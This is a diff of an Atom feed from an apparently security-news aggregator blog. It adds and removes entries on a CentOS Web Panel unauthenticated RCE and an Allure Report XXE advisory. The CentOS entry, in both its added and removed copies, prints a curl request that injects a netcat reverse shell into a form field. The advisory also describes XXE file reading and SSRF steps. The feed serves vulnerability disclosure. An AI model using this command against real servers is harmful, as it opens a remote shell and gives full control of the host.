@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-06-25T13:45:25.042Z</updated>
+  <updated>2025-06-25T14:30:17.522Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,57 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>CentOS Web Panel 未授权远程代码执行漏洞</title>
+    <link href="http://example.com/2025/06/25/github_1170031665/"/>
+    <id>http://example.com/2025/06/25/github_1170031665/</id>
+    <published>2025-06-25T14:30:17.526Z</published>
+    <updated>2025-06-25T14:30:17.522Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> CentOS Web Panel 未授权远程代码执行漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-48703</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> CentOS Web Panel 存在未授权远程代码执行漏洞，攻击者可以通过构造特定的请求，无需认证即可在服务器上执行任意命令，导致服务器被完全控制。</p><p><strong>产品厂商：</strong> CentOS Web Panel</p><p><strong>产品名称：</strong> CentOS Web Panel</p><p><strong>来源：</strong> <a href="https://github.com/rapid7/metasploit-framework/issues/20344">https://github.com/rapid7/metasploit-framework/issues/20344</a></p><p><strong>类型：</strong> rapid7&#x2F;metasploit-framework:github issues</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h3 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h3><p>Unauthenticated remote code execution in CentOS Web Panel - CVE-2025-48703</p><h4 id="Basic-example"><a href="#Basic-example" class="headerlink" title="Basic example"></a>Basic example</h4><p>Working exploit:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs command">$ curl -kis &#x27;https://127.0.0.1:52083/myuser/index.php?module=filemanager&amp;acc=changePerm&#x27; --data &#x27;fileName=.bashrc&amp;currentPath=/home/myuser&amp;t_total=`nc 1.2.3.4 9999 -e /bin/bash`&#x27;<br>$<br></code></pre></td></tr></table></figure><p>Courtesy of <a href="https://fenrisk.com/rce-centos-webpanel">https://fenrisk.com/rce-centos-webpanel</a></p><h4 id="Motivation"><a href="#Motivation" class="headerlink" title="Motivation"></a>Motivation</h4><p>Unauthenticated one-shot RCE on a popular web management panel is pretty cool.</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; CentOS Web Panel 未授权远程代码执行漏洞&lt;/p&gt;
+&lt;p&gt;&lt;st</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    
+    <category term="rapid7/metasploit-framework:github issues" scheme="http://example.com/tags/rapid7-metasploit-framework-github-issues/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Allure Report allows Improper XXE Restriction via DocumentBuilderFactory</title>
+    <link href="http://example.com/2025/06/25/github_342469145/"/>
+    <id>http://example.com/2025/06/25/github_342469145/</id>
+    <published>2025-06-25T14:30:05.616Z</published>
+    <updated>2025-06-25T14:30:05.614Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://github.com/advisories/GHSA-h7qf-qmf3-85qg">https://github.com/advisories/GHSA-h7qf-qmf3-85qg</a></p><p><strong>仓库 Star：</strong> 4689</p><p><strong>CVSS 评分：</strong> 7.5</p><p><strong>参考链接：</strong></p><ul><li><p><a href="https://github.com/allure-framework/allure2/security/advisories/GHSA-h7qf-qmf3-85qg">https://github.com/allure-framework/allure2/security/advisories/GHSA-h7qf-qmf3-85qg</a></p></li><li><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-52888">https://nvd.nist.gov/vuln/detail/CVE-2025-52888</a></p></li><li><p><a href="https://github.com/allure-framework/allure2/commit/cbcb33719851ff70adce85d38e15d20fc58d4eb7">https://github.com/allure-framework/allure2/commit/cbcb33719851ff70adce85d38e15d20fc58d4eb7</a></p></li><li><p><a href="https://github.com/advisories/GHSA-h7qf-qmf3-85qg">https://github.com/advisories/GHSA-h7qf-qmf3-85qg</a></p></li></ul><p><strong>描述：</strong></p><h3 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h3><p>A critical XML External Entity (XXE) vulnerability exists in the xunit-xml-plugin used by Allure 2. The plugin fails to securely configure the XML parser (<code>DocumentBuilderFactory</code>) and allows external entity expansion when processing test result .xml files. This allows attackers to read arbitrary files from the file system and potentially trigger server-side request forgery (SSRF).</p><h3 id="Details"><a href="#Details" class="headerlink" title="Details"></a>Details</h3><p>In <code>\allure2-main\plugins\xunit-xml-plugin\src\main\java\io\qameta\allure\xunitxml\XunitXmlPlugin.java</code> the application uses <code>DocumentBuilderFactory</code> without disabling DTDs or external entities. By generating a report with a malicious xml file within it, an attacker can perform XXE to leverage SSRF, or to read system files.</p><h3 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h3><p>To recreate this vulnerability, you need to install allure for command-line (In my POC I used a Windows 11 Machine). </p><ol><li>Create a folder called <code>allure</code>, and within it, create a malicious XML file. I will attach my SSRF and file reading payloads, however, for the rest of the POC, I will focus on reading system files for better screenshots.</li></ol><p>##SSRF (replace webhook link with your own)<br><img src="https://github.com/user-attachments/assets/a1a9a438-b6f1-4675-973f-a43847a84519" alt="image"></p><p>##Reading System Files<br><img src="https://github.com/user-attachments/assets/eb0e1e60-1f76-42e7-b68d-2137bed62fe9" alt="image"></p><ol start="2"><li>Put the malicious .xml file into the <code>allure</code> directory created previously</li><li>Run the following command to run the report <code>allure generate C:\path\to\directory\allure -o report --clean</code></li><li>To view and confirm the executed payload, run <code>allure open report</code></li><li>When the report opens, confirm the payload executedby going to <code>Categories &gt; Product defects &gt; &lt;payload response&gt;</code><br><img src="https://github.com/user-attachments/assets/e7244550-2e9f-4066-b282-86f1eb8cf5e4" alt="image"></li></ol><h3 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h3><p>The explained XXE vulnerability can lead to Arbitrary File Disclosure and Server-Side Request Forgery. This exploitation can also be carried out silently, meaning it can be carried out without user interaction if the tool is automated within an application, and can go undetected with a carefully crafted payload. This could allow a malicious actor to view other source codes which may contain API or product keys, internal application URLs, or other secret items. This makes it an especially high risk when ran within a CI&#x2F;CD platform.</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://github.com/advisories/GHSA-h7qf-qmf3-85qg&quot;&gt;https://github.com/advisories/GHSA-h7qf-qmf3-85qg&lt;/a&gt;&lt;/p</summary>
+      
+    
+    
+    
+    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
+    
+    
+    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
+    
+  </entry>
   
   <entry>
     <title>Skyvern SSTI Remote Code Execution</title>
@@ -284,33 +335,6 @@
   </entry>
   
   <entry>
-    <title>CentOS Web Panel 未授权远程代码执行漏洞</title>
-    <link href="http://example.com/2025/06/25/github_1170031665/"/>
-    <id>http://example.com/2025/06/25/github_1170031665/</id>
-    <published>2025-06-25T10:15:46.458Z</published>
-    <updated>2025-06-25T10:15:46.453Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> CentOS Web Panel 未授权远程代码执行漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-48703</li></ul><p><strong>漏洞类型：</strong> 未授权访问</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> CentOS Web Panel 存在未授权远程代码执行漏洞，攻击者可以通过构造特定的请求，无需认证即可在服务器上执行任意代码。</p><p><strong>产品厂商：</strong> CentOS Web Panel</p><p><strong>产品名称：</strong> CentOS Web Panel</p><p><strong>来源：</strong> <a href="https://github.com/rapid7/metasploit-framework/issues/20344">https://github.com/rapid7/metasploit-framework/issues/20344</a></p><p><strong>类型：</strong> rapid7&#x2F;metasploit-framework:github issues</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h3 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h3><p>Unauthenticated remote code execution in CentOS Web Panel - CVE-2025-48703</p><h4 id="Basic-example"><a href="#Basic-example" class="headerlink" title="Basic example"></a>Basic example</h4><p>Working exploit:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs command">$ curl -kis &#x27;https://127.0.0.1:52083/myuser/index.php?module=filemanager&amp;acc=changePerm&#x27; --data &#x27;fileName=.bashrc&amp;currentPath=/home/myuser&amp;t_total=`nc 1.2.3.4 9999 -e /bin/bash`&#x27;<br>$<br></code></pre></td></tr></table></figure><p>Courtesy of <a href="https://fenrisk.com/rce-centos-webpanel">https://fenrisk.com/rce-centos-webpanel</a></p><h4 id="Motivation"><a href="#Motivation" class="headerlink" title="Motivation"></a>Motivation</h4><p>Unauthenticated one-shot RCE on a popular web management panel is pretty cool.</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; CentOS Web Panel 未授权远程代码执行漏洞&lt;/p&gt;
-&lt;p&gt;&lt;st</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="rapid7/metasploit-framework:github issues" scheme="http://example.com/tags/rapid7-metasploit-framework-github-issues/"/>
-    
-    <category term="未授权访问" scheme="http://example.com/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
-    
-  </entry>
-  
-  <entry>
     <title>VMware ESXi &amp; Horizon DaaS OpenSLP 缓冲区溢出漏洞</title>
     <link href="http://example.com/2025/06/25/github_34286076/"/>
     <id>http://example.com/2025/06/25/github_34286076/</id>
@@ -520,33 +544,6 @@
     <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
     
     <category term="飓风网络安全" scheme="http://example.com/tags/%E9%A3%93%E9%A3%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>外媒狗鼻子是真灵，科学家发论文立马引来污蔑</title>
-    <link href="http://example.com/2025/06/25/weixin_3987701709/"/>
-    <id>http://example.com/2025/06/25/weixin_3987701709/</id>
-    <published>2025-06-25T09:40:35.469Z</published>
-    <updated>2025-06-25T09:40:35.467Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>公众号：</strong> 独眼情报</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/2onSwUM5ga-zDZSzh5Z8GQ">https://mp.weixin.qq.com/s/2onSwUM5ga-zDZSzh5Z8GQ</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 独眼情报&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/2onSwUM5ga-zDZSzh5Z8GQ&quot;&gt;https://mp.weixin.qq.c</summary>
-      
-    
-    
-    
-    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
-    
-    
-    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
-    
-    <category term="独眼情报" scheme="http://example.com/tags/%E7%8B%AC%E7%9C%BC%E6%83%85%E6%8A%A5/"/>
     
   </entry>
   
